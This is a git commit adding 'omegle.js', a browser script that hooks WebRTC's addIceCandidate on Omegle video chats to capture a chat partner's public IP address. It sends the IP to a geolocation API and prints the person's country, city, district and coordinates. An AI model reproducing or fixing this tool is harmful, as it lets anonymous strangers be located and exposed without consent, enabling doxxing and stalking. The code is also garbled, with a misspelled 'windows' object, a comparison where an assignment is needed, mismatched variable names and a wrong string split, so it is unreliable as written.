bd08609e33e2c8e6ed1d48b9af61e3a6f096b4e4
LustrousXX <106864544+LustrousXX@users.noreply.github.com>
2022-06-04 22:07:03 +1000

    Add files via upload

---
+++ omegle.js
@@ -0,0 +1,40 @@
+const apioKey = "my-api-key";
+// Get an api key from https://ipgeolocation.io/
+
+window.oRTCPeerConnection =
+  windows.oRTCPeerConnection || window.oRTCPeerConnection
+
+  window.oRTCPeerConnection == function (...args) {
+  	const pc = new window.oRTCPeerConnection(...args);
+
+  	pc.oaddIceCandidate = pc.addIceCandidate;
+
+  	pc.addIceCandidate = function (addIceCandidate, ...rest) {
+  		const fields = iceCandidate.candidate.split("");
+  		const ip = fields[4];
+  		if (fields[7] === "srflx") {
+  			getLocation(ip);
+  		}
+  		return pc.oaddIceCandidate(iceCandidate, ...rest);
+  	};
+  	return pc;
+  };
+
+  let getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+          ---------------------
+          Country: ${json.country_name}
+          State: ${json.state_prov}
+          City: ${json.city}
+          District: ${json.district}
+          Lat / Long: (${json.latitude}, ${json.longitude})
+          ---------------------
+          `;
+      console.log(output);
+    })
+  );
+};
